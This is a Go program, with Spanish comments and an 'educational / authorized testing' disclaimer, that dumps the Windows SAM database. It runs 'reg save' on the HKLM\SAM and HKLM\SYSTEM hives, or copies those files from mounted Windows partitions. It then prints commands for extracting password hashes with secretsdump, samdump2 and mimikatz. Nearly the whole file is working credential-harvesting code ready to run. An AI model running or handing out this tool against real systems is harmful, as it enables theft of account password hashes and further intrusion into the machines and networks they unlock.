package main

/*
Script de Volcado de Base de Datos SAM
SAM Database Dump Script

Autor: RedTeam-Bypass
Versión: 1.0
Propósito: Educativo / Pruebas de penetración autorizadas
Purpose: Educational / Authorized Penetration Testing

ADVERTENCIA: Este script es solo para uso educativo y pruebas autorizadas.
WARNING: This script is for educational and authorized testing only.
*/

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

// Códigos de color ANSI
const (
	ColorRed    = "\033[0;31m"
	ColorGreen  = "\033[0;32m"
	ColorYellow = "\033[1;33m"
	ColorCyan   = "\033[0;36m"
	ColorWhite  = "\033[1;37m"
	ColorGray   = "\033[0;37m"
	ColorReset  = "\033[0m"
)

// SAMDumper estructura principal
type SAMDumper struct {
	outputDir  string
	samFile    string
	systemFile string
	useColor   bool
}

// NewSAMDumper crea una nueva instancia de SAMDumper
func NewSAMDumper() *SAMDumper {
	return &SAMDumper{
		useColor: runtime.GOOS != "windows",
	}
}

// color aplica color al texto si está habilitado
func (s *SAMDumper) color(color, text string) string {
	if s.useColor {
		return color + text + ColorReset
	}
	return text
}

// printBanner muestra el banner del script
func (s *SAMDumper) printBanner() {
	line := strings.Repeat("=", 60)
	fmt.Println(s.color(ColorCyan, line))
	fmt.Println(s.color(ColorCyan, "   Volcado de Base de Datos SAM - DumpSAM.go"))
	fmt.Println(s.color(ColorCyan, "   SAM Database Dump Tool"))
	fmt.Println(s.color(ColorCyan, line))
	fmt.Println()
}

// printSystemInfo muestra información del sistema
func (s *SAMDumper) printSystemInfo() {
	hostname, _ := os.Hostname()
	fmt.Println(s.color(ColorCyan, "[*] Información del Sistema:"))
	fmt.Printf("%s    Sistema Operativo:  %s\n", s.color(ColorWhite, ""), runtime.GOOS)
	fmt.Printf("%s    Arquitectura:       %s\n", s.color(ColorWhite, ""), runtime.GOARCH)
	fmt.Printf("%s    Hostname:           %s\n", s.color(ColorWhite, ""), hostname)
	fmt.Println()
}

// printSAMInfo muestra información educativa sobre SAM
func (s *SAMDumper) printSAMInfo() {
	fmt.Println(s.color(ColorCyan, "[*] Información sobre la Base de Datos SAM:"))
	fmt.Println()
	fmt.Println(s.color(ColorWhite, "La base de datos Security Account Manager (SAM) contiene:"))
	fmt.Println(s.color(ColorGray, "  - Nombres de usuario locales"))
	fmt.Println(s.color(ColorGray, "  - Hashes de contraseñas (NT hash, LM hash obsoleto)"))
	fmt.Println(s.color(ColorGray, "  - SIDs (Security Identifiers)"))
	fmt.Println(s.color(ColorGray, "  - Membresías de grupos"))
	fmt.Println()
	fmt.Println(s.color(ColorGray, "Ubicación en Windows:"))
	fmt.Println(s.color(ColorGray, "  - Archivo: C:\\Windows\\System32\\config\\SAM"))
	fmt.Println(s.color(ColorGray, "  - Registro: HKLM\\SAM\\SAM\\Domains\\Account\\Users"))
	fmt.Println()
	fmt.Println(s.color(ColorGray, "Estructura de cifrado de hashes:"))
	fmt.Println(s.color(ColorGray, "  1. Hash MD4 de la contraseña (NT hash)"))
	fmt.Println(s.color(ColorGray, "  2. Cifrado DES con RID del usuario como clave"))
	fmt.Println(s.color(ColorGray, "  3. Cifrado con Password Encryption Key (PEK)"))
	fmt.Println(s.color(ColorGray, "  4. PEK cifrado con LSA System Key"))
	fmt.Println()
}

// isAdmin verifica si el proceso se ejecuta con privilegios de administrador
func (s *SAMDumper) isAdmin() bool {
	if runtime.GOOS == "windows" {
		// En Windows, intentar abrir un archivo protegido
		_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
		return err == nil
	}
	// En Linux/Unix, verificar si es root
	return os.Geteuid() == 0
}

// findSAMFiles busca archivos SAM y SYSTEM en el sistema
func (s *SAMDumper) findSAMFiles() (string, string, error) {
	fmt.Println(s.color(ColorYellow, "[*] Buscando archivos SAM en el sistema..."))

	var samLocations, systemLocations []string

	if runtime.GOOS == "windows" {
		samLocations = []string{
			"C:\\Windows\\System32\\config\\SAM",
			"C:\\Windows\\System32\\config\\RegBack\\SAM",
		}
		systemLocations = []string{
			"C:\\Windows\\System32\\config\\SYSTEM",
			"C:\\Windows\\System32\\config\\RegBack\\SYSTEM",
		}
	} else {
		samLocations = []string{
			"/mnt/c/Windows/System32/config/SAM",
			"/media/Windows/System32/config/SAM",
		}
		systemLocations = []string{
			"/mnt/c/Windows/System32/config/SYSTEM",
			"/media/Windows/System32/config/SYSTEM",
		}
	}

	var samFile, systemFile string

	// Buscar archivo SAM
	for _, location := range samLocations {
		if _, err := os.Stat(location); err == nil {
			samFile = location
			fmt.Println(s.color(ColorGreen, "[+] Archivo SAM encontrado: "+samFile))
			break
		}
	}

	// Buscar archivo SYSTEM
	for _, location := range systemLocations {
		if _, err := os.Stat(location); err == nil {
			systemFile = location
			fmt.Println(s.color(ColorGreen, "[+] Archivo SYSTEM encontrado: "+systemFile))
			break
		}
	}

	fmt.Println()

	if samFile == "" || systemFile == "" {
		return "", "", fmt.Errorf("no se encontraron archivos SAM/SYSTEM")
	}

	return samFile, systemFile, nil
}

// exportRegistryKeys exporta las claves de registro en Windows
func (s *SAMDumper) exportRegistryKeys() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("esta función solo está disponible en Windows")
	}

	fmt.Println(s.color(ColorYellow, "[*] Exportando claves de registro..."))

	samOutput := filepath.Join(s.outputDir, "sam.hive")
	systemOutput := filepath.Join(s.outputDir, "system.hive")

	// Exportar SAM
	fmt.Println(s.color(ColorYellow, "[*] Exportando clave SAM..."))
	cmd := exec.Command("reg", "save", "HKLM\\SAM", samOutput)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("error al exportar SAM: %v", err)
	}

	// Exportar SYSTEM
	fmt.Println(s.color(ColorYellow, "[*] Exportando clave SYSTEM..."))
	cmd = exec.Command("reg", "save", "HKLM\\SYSTEM", systemOutput)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("error al exportar SYSTEM: %v", err)
	}

	fmt.Println(s.color(ColorGreen, "[+] Claves exportadas exitosamente"))
	fmt.Printf("%s    SAM:    %s\n", s.color(ColorWhite, ""), samOutput)
	fmt.Printf("%s    SYSTEM: %s\n", s.color(ColorWhite, ""), systemOutput)
	fmt.Println()

	s.samFile = samOutput
	s.systemFile = systemOutput

	return nil
}

// copyFile copia un archivo de origen a destino
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}

// copySAMFiles copia los archivos SAM y SYSTEM al directorio de salida
func (s *SAMDumper) copySAMFiles(samSrc, systemSrc string) error {
	fmt.Println(s.color(ColorYellow, "[*] Copiando archivos SAM y SYSTEM..."))

	samDst := filepath.Join(s.outputDir, "sam.hive")
	systemDst := filepath.Join(s.outputDir, "system.hive")

	if err := copyFile(samSrc, samDst); err != nil {
		return fmt.Errorf("error al copiar SAM: %v", err)
	}
	fmt.Println(s.color(ColorGreen, "[+] SAM copiado a: "+samDst))

	if err := copyFile(systemSrc, systemDst); err != nil {
		return fmt.Errorf("error al copiar SYSTEM: %v", err)
	}
	fmt.Println(s.color(ColorGreen, "[+] SYSTEM copiado a: "+systemDst))

	fmt.Println()

	s.samFile = samDst
	s.systemFile = systemDst

	return nil
}

// showExtractionTools muestra información sobre herramientas de extracción
func (s *SAMDumper) showExtractionTools() {
	fmt.Println(s.color(ColorCyan, "[*] Herramientas disponibles para extraer hashes:"))
	fmt.Println()
	fmt.Println(s.color(ColorWhite, "1. secretsdump.py (Impacket)"))
	fmt.Println(s.color(ColorGray, "   Instalación: pip install impacket"))
	fmt.Printf("%s   Uso: python -m impacket.examples.secretsdump -sam %s -system %s LOCAL\n",
		s.color(ColorGray, ""), s.samFile, s.systemFile)
	fmt.Println()
	fmt.Println(s.color(ColorWhite, "2. samdump2 (Linux)"))
	fmt.Println(s.color(ColorGray, "   Instalación: apt-get install samdump2"))
	fmt.Printf("%s   Uso: samdump2 %s %s\n", s.color(ColorGray, ""), s.systemFile, s.samFile)
	fmt.Println()
	fmt.Println(s.color(ColorWhite, "3. mimikatz (Windows)"))
	fmt.Printf("%s   Uso: lsadump::sam /sam:%s /system:%s\n",
		s.color(ColorGray, ""), s.samFile, s.systemFile)
	fmt.Println()
}

// readUserInput lee la entrada del usuario
func readUserInput(prompt string) string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(prompt)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

// run ejecuta el proceso principal
func (s *SAMDumper) run() error {
	s.printBanner()
	s.printSystemInfo()

	// Verificar privilegios de administrador
	if !s.isAdmin() {
		fmt.Println(s.color(ColorRed, "[!] ADVERTENCIA: Este script requiere privilegios de administrador"))
		fmt.Println(s.color(ColorRed, "[!] Por favor, ejecute como administrador/root"))
		fmt.Println()
	} else {
		fmt.Println(s.color(ColorGreen, "[+] Ejecutando con privilegios de administrador"))
		fmt.Println()
	}

	s.printSAMInfo()

	// Crear directorio temporal de salida
	tempDir, err := os.MkdirTemp("", "sam_dump_*")
	if err != nil {
		return fmt.Errorf("error al crear directorio temporal: %v", err)
	}
	s.outputDir = tempDir

	fmt.Printf("%s[*] Directorio de salida: %s\n", s.color(ColorCyan, ""), s.outputDir)
	fmt.Println()

	// Buscar o exportar archivos SAM
	if runtime.GOOS == "windows" {
		response := readUserInput(s.color(ColorYellow, "[?] ¿Desea exportar las claves de registro? (s/n): "))
		if strings.ToLower(response) == "s" || strings.ToLower(response) == "y" {
			if err := s.exportRegistryKeys(); err != nil {
				return err
			}
		}
	} else {
		samFile, systemFile, err := s.findSAMFiles()
		if err != nil {
			return err
		}
		if err := s.copySAMFiles(samFile, systemFile); err != nil {
			return err
		}
	}

	// Mostrar herramientas de extracción
	s.showExtractionTools()

	fmt.Println()
	fmt.Println(s.color(ColorCyan, "[*] Archivos guardados en: "+s.outputDir))
	fmt.Println(s.color(ColorCyan, "[*] Proceso completado"))

	return nil
}

func main() {
	dumper := NewSAMDumper()

	if err := dumper.run(); err != nil {
		fmt.Fprintf(os.Stderr, "%s[!] Error: %v%s\n", ColorRed, err, ColorReset)
		os.Exit(1)
	}
}
